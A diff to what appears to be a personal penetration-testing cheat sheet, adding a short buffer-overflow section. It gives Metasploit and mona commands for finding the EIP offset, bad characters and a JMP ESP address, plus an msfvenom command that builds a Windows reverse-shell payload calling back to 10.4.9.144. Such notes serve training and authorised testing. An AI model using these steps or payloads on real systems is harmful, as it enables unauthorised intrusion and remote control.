@@ -496,6 +496,32 @@ list_tokens -g
 impersonate_token "BUILTIN\Administrators
 ```
 
+## buffer overflow
+
+generate cyclic pattern to find offset to EIP register
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 900
+```
+
+find bad chars -a is ESP register
+remember to set EIP to random value during check
+```
+!mona config -set workingfolder c:\mona\%p
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30
+```
+
+
+find return address
+```
+!mona jmp -r esp -cpb "\x00\x04\x05\x3e\x3f\xe1\xe2"
+```
+
+generate payload
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=1234 EXITFUNC=thread -b "\x00\x04\x05\x3e\x3f\xe1\xe2" -f c
+```
+
 
 ## CheckList
 
